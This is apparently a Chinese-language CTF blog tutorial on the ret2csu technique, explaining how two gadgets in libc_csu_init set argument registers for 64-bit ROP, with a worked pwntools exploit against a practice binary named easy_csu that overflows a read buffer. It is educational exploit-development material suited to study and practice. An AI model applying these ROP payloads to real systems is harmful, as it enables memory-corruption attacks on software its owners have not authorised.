---
title: ret2csu - 万能Gadgets
date: 2020-06-15 16:09:23
categories:
- Theories
- Assembler
tags:
- PWN
- ROP
---
## Introduction

&emsp;&emsp;2018年blackhat大会提出了ret2csu，即通过libc_csu_init中两个特殊的gadgets实现64位程序的万能传参。

<!-- more -->

&emsp;&emsp;libc_csu_init函数功能是对libc进行初始化操作，一般程序都会调用libc函数，所以这个函数基本上都存在，故而称为万能gadgets。

![](/img/Useful-Gadgets/Useful-Gadgets1.png)

&emsp;&emsp;通过汇编代码可以发现，利用这两个gadgets可以依次实现rbx、rbp、r12、rdx、rsi、edi寄存器的赋值。

&emsp;&emsp;在x86的程序中，函数的前6个参数的赋值是依次通过rdi、rsi、rdx、rcx、r8、r9寄存器实现。所以上面我们控制的寄存器中，r12、rdx、rsi和edi寄存器更加吸引我们的注意力，因为他们分别保存着将要调用的函数的指针的地址、第三个参数、第二个参数和第一个参数。

&emsp;&emsp;而rbx和rbp寄存器我们也不能忽视，他们的值必须分别被置为0和1。因为在gadget2中，最后一个指令`call [r12 + rbx*8]`，将rbx置0则指令将变成`call [r12]`，方便传参。此外需要注意的是，r12中设置的应该为要调用的函数的指针的地址，即got地址而不是plt地址。

&emsp;&emsp;因为jne指令与je指令正好相反，只有当零标志ZF=0时跳转，ZF=1时顺序执行下一条指令，即不相等时转移。前一条指令`cmp rbx，rbp`中rbx再执行完`add rbx，0`之后必然值为1。所以为了不跳转，必须将rbp的值也置为1，使得汇编指令能够顺序执行而不是跳转到1110行再次执行call指令，这样可能会造成错误。

## Example：easy_csu

### Step 1

&emsp;&emsp;程序运行截图：

![](/img/Useful-Gadgets/Useful-Gadgets2.png)

&emsp;&emsp;checksec：64位程序

![](/img/Useful-Gadgets/Useful-Gadgets3.png)

### Step 2

&emsp;&emsp;把程序丢到hopper中，发现main函数中read函数存在溢出漏洞：

![](/img/Useful-Gadgets/Useful-Gadgets4.png)

&emsp;&emsp;看一下vul函数，发现只要调用vul函数，且将vul函数的第3个参数设为3即可：

![](/img/Useful-Gadgets/Useful-Gadgets5.png)

&emsp;&emsp;由于这是64位的程序，所以通过寄存器传参，但是通过ROPgadget并没有发现可以用的gadgets：

![](/img/Useful-Gadgets/Useful-Gadgets6.png)

&emsp;&emsp;于是我们就想到万能gadgets：

![](/img/Useful-Gadgets/Useful-Gadgets7.png)

&emsp;&emsp;所以可以构造这样一个ROP链：首先跳转到loc_4011fe即gadget1给寄存器赋值，然后ret到gadget2将参数转移到需要的寄存器中去，但是gadget2运行后会再次执行一遍gadget1，这样会使得栈空间提升8*7总共56字节，所以我们还需要padding56个字节，然后才能覆盖ret到需要的地址上去。

&emsp;&emsp;在我们给r12赋值的时候，刚开始的想法是直接填上vul函数的地址。但是根据上面关于ret2csu的介绍，r12中应该置为vul函数指针的地址。所以我们需要找到一个指针，再劫持这个指针指向vul函数......这也太麻烦了，而且这样一来题目的初衷和重心就变了。

&emsp;&emsp;为了解决这个问题，我们选择一个简单的办法。用init_array_start函数的指针来跳过gadget2中的那条call指令。init_array_start函数是ELF程序的一个初始化函数，运行它不会对栈空间造成影响，可以说是用于跳过call指令的最佳选择。

### Step 3

&emsp;&emsp;于是最终的EXP就是这样的：

```Python
* from pwn import *
* 
* sh = process('./easy_csu')
* elf = ELF('easy_csu')
* 
* gadget1 = 0x401202
* gadget2 = 0x4011e8
* 
* init_addr = elf.symbols['__init_array_start']
* vul_addr = elf.symbols['vul']
* 
* payload = 'a' * (0x20 + 0x8)
* payload += p64(gadget1) + p64(0) + p64(1) + p64(init_addr) + p64(0) + p64(0)+ p64(3)
* payload += p64(gadget2) + 'a' * 56
* payload += p64(vul_addr)
* 
* sh.sendline(payload)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;EXP运行结果图：

![](/img/Useful-Gadgets/Useful-Gadgets8.png)